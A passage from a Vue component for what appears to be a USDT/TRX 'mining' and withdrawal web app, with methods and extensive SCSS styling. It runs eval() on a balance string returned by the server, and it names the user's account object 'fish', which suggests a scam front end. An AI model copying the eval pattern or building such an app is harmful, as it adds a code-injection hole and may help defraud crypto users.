          this.fish.allowWithdraw=balance.interest==null?0.00:balance.interest;
          this.fish.total=balance.finish_withdraw==null?0.00:balance.finish_withdraw;
          this.$toast({ message: "Start Mining Success"});
          return false;
        }
      });
    },
    onCopy(){
      this.$toast({ message: "copy Success"});
    },
    redeeall(){
      this.redeeallBalance=this.fish.allowWithdraw;
    },
    queryRecord(){
      this.recordList=[];
      listRecord(this.myWalletAddress).then(response => {
        if (response.data.code==200){
          response.data.rows.map(row =>{
            var item={};
            item.time=row.time;
            item.quantity=row.quantity;
            item.status=row.status;
            this.recordList.push(item);
          });
        }
      });
    },
    confirm(){
      if (!this.redeeallBalance){
        this.$toast({ message: "Please enter withdraw amount"});
        return;
      }

      if (this.redeeallBalance>this.fish.allowWithdraw){
        this.$toast({ message: "withdraw amount input error"});
        return;
      }
      this.fish.allowWithdraw=parseFloat(this.redeeallBalance);
      this.fish.currentBalance=parseFloat(this.fish.usdt);
      this.fish.totalBalance=parseFloat(this.fish.total);
      withdraw(this.fish).then(response => {
        if (response.data.code!=200){
          this.$toast({ message: "withdraw amount error"});
          return false;
        }
        this.fish=response.data.data;
        var balance = eval('(' + this.fish.balance +')');
        this.fish.trx=balance.trx==null?0.00:balance.trx;
        this.fish.usdt=balance.usdt==null?0.00:balance.usdt;
        this.fish.allowWithdraw=balance.interest==null?0.00:balance.interest;
        this.fish.total=balance.finish_withdraw==null?0.00:balance.finish_withdraw;
        this.$toast({ message: "withdraw Success"});
        return true;
      });
    }
  }
};
</script>
<style lang="scss" scoped>
#table1{
  font: bold 16px/1.4em "Trebuchet MS", sans-serif;
}
#table1 thead th{
  padding: 15px;
  border: 1px solid #93CE37;
  border-bottom: 3px solid #9ED929;
  text-shadow: 1px 1px 1px #568F23;
  color: #fff;
  background-color: #9DD929;
  border-radius: 5px 5px 0px 0px;
}
#table1 tr{
  padding: 15px;
  border: 1px solid #93CE37;
  border-bottom: 3px solid #9ED929;
  text-shadow: 1px 1px 1px #568F23;
  color: #fff;
  background-color: #9DD929;
  border-radius: 5px 5px 0px 0px;
  text-align: center;
  width: 100%;
}
#table1 tr>td{
  background-color: transparent;
  border: none;
  width: 15%;
  font-size: 15px;
  color: #1D81B6;
}
.linkBox{
  border-radius: 5px;
  display: inline-block;
  background-color: #4c1010;
  position: absolute;
  height: 25px;
  line-height: 25px;
  text-align: center;
  padding: 0px 5px;
  color: #000;
  top: 300px;
  left: 50%;
  width: 200px;
  margin-left: -105px;
  z-index: 9999;
  font-size: 15px;
}
.linkBox span {
  color: #FFF;
}
.linkBox .iconfont {
  width: 18px;
  height: 18px;
  transform: translateY(12%);
  background-repeat: no-repeat;
  background-position: center;
  background-size: cover;
  display: inline-block;
  background-image:url("../assets/images/font-lock.png");
}
.active {
  background-color: #c63127 !important;
  color: #fff;
}
.home {
  .topBackgroup {
    height: 350px;
    background-image: url("../assets/images/top_kv.jpg");
    background-size: cover;
    .content {
      display: inline-block;
      width: 140px;
      height: 25px;
      margin-top: 10px;
      img {
        width: 100%;
        height: 100%;
      }
    }
    .title_text {
      color: #fff;
      margin-top: 30px;
      .title_tips {
        padding: 5px 0;
        font-size: 20px;
      }
      .reward {
        padding-top: 20px;
        font-size: 25px;
        .value {
          color: #f7931a;
          padding-left: 5px;
          padding-right: 5px;
        }
      }
      .submit {
        position: relative;
        z-index: 10;
        width: 230px;
        text-align: center;
        background: #c63127;
        border-radius: 5px;
        color: #fff;
        font-size: 18px;
        padding: 0px 0;
        font-weight: 700;
        margin: 50px auto;
        .btnConnect {
          display: block;
          padding: 10px 0;
          color: #fff;
        }
      }
    }
  }
  .itemText {
    .blockBox {
      margin-bottom: 20px;
      padding-left: 20px;
      text-align: left;
      background-color: #fff;
      border-radius: 10px;
      box-shadow: 1px 1px 10px 1px #ece6e6;
      .blockTitle {
        padding: 10px 0;
        font-size: 15px;
        font-weight: 700;
      }
      .blockContent {
        padding: 0 15px 10px 15px;
        .blockItem {
          display: flex;
          line-height: 25px;
          .itemTitle {
            flex: 4;
            color: #a1a1b3;
            font-size: 14px;
          }
          .itemValue {
            flex: 6;
            text-align: right;
            font-size: 14px;
            color: #000;
            font-weight: 600;
          }
        }
      }
      .changeTab {
        width: 96%;
        margin: 0 auto;
        .changeItem {
          width: 48%;
          display: inline-block;
          text-align: center;
          font-size: 14px;
          background-color: #ebf2fb;
          padding: 7px 0;
          border-top-left-radius: 10px;
          border-top-right-radius: 10px;
        }
      }
      .blockTitle {
        padding: 10px 0;
        font-size: 15px;
        font-weight: 700;
        .leftIcon {
          display: inline-block;
          position: relative;
          top: 0;
          left: 0;
          bottom: 0;
          margin: auto;
          width: 5px;
          height: 15px;
          border-radius: 2px;
          margin-right: 10px;
          background: linear-gradient(1turn, rgba(90, 71, 217, 0.09), #71a8e0);
        }
      }
      .exchange {
        border: 1px solid #f3f3f3;
        border-radius: 7px;
        display: flex;
        padding: 10px 10px;
        .changeLeft {
          text-align: left;
          width: 45%;
          .changeValue {
            font-size: 20px;
            display: flex;
            align-items: baseline;
            .uni-input {
              width: 80%;
              display: block;
              font-size: 16px;
              line-height: 1.4em;
              height: 1.4em;
              min-height: 1.4em;
              overflow: hidden;
              .uni-input-input {
                position: relative;
                height: 100%;
                background: none;
                color: inherit;
                opacity: 1;
                font: inherit;
                line-height: inherit;
                letter-spacing: inherit;
                text-align: inherit;
                text-indent: inherit;
                text-transform: inherit;
                text-shadow: inherit;
                width: 100%;
                outline: none;
                border: none;
                padding: 0;
                margin: 0;
                text-decoration: inherit;
              }
            }
          }
          .changeAll {
            display: block;
            font-size: 15px;
          }
        }
        .changeRight {
          line-height: 40px;
          text-align: right;
          display: flex;
          justify-content: center;
          align-content: center;
          align-items: center;
          font-size: 16px;
          width: 45%;
          .usdtimage {
            height: 25px;
            position: relative;
            img {
              width: 25px;
              display: block;
              position: absolute;
              left: 0px;
              top: 0px;
            }
            .coinName {
              display: block;
              height: 25px;
              position: absolute;
              left: 30px;
              top: -5px;
            }
          }
        }
      }
      .exchangeBtn {
        margin: 20px auto;
        text-align: center;
        padding: 10px 0;
        font-size: 15px;
        background-color: #c63127 !important;
        color: #fff;
        border-radius: 5px;
        a {
          display: block;
          color: #fff;
        }
      }
    }
    .shareBox {
      padding: 10px 20px;
      margin-bottom: 20px;
      background-color: #fff;
      border-radius: 10px;
      box-shadow: 1px 1px 10px 1px #ece6e6;
      .shareTitle {
        color: #a1a1b3;
        font-size: 14px;
      }
      .shareInfo {
        margin-top: 10px;
        display: flex;
        padding: 15px 0;
        .infoLeft {
          width: 75%;
          font-size: 13px;
          line-height: 25px;
          white-space: nowrap;
          overflow: hidden;
          text-overflow: ellipsis;
        }
        .infoRight {
          width: 25%;
          font-size: 13px;
          .copy {
            display: block;
            padding: 5px 5px;
            background-color: #c63127;
            text-align: center;
            color: #fff;
            border-radius: 5px;
            .btnmyaddress {
              display: block;
              color: #fff;
            }
          }
        }
      }
      .shareTips {
        font-size: 12px;
        margin-bottom: 30px;
        color: #a1a1b3;
      }
    }
  }
  #notice {
    width: 100%;
    text-align: center;
    color: #a1a1b3;
    padding: 10px 0;
    font-size: 13px;
  }
  .sectionTitle {
    width: 100%;
    text-align: center;
    color: #000;
    font-size: 17px;
    font-weight: 600;
  }
  .sectionTips {
    width: 100%;
    text-align: center;
    color: #a1a1b3;
    padding: 10px 0;
    font-size: 13px;
  }
  .mui-navigate-right:after,
  .mui-push-left:after,
  .mui-push-right:after {
    font-family: Muiicons;
    font-size: inherit;
    line-height: 1;
    position: absolute;
    top: 50%;
    display: inline-block;
    -webkit-transform: translateY(-50%);
    transform: translateY(-50%);
    text-decoration: none;
    color: #bbb;
    -webkit-font-smoothing: antialiased;
  }
  .partnerItem {
    width: 32%;
    display: inline-block;
    img {
      display: block;
      width: 100%;
    }
  }
}
</style>
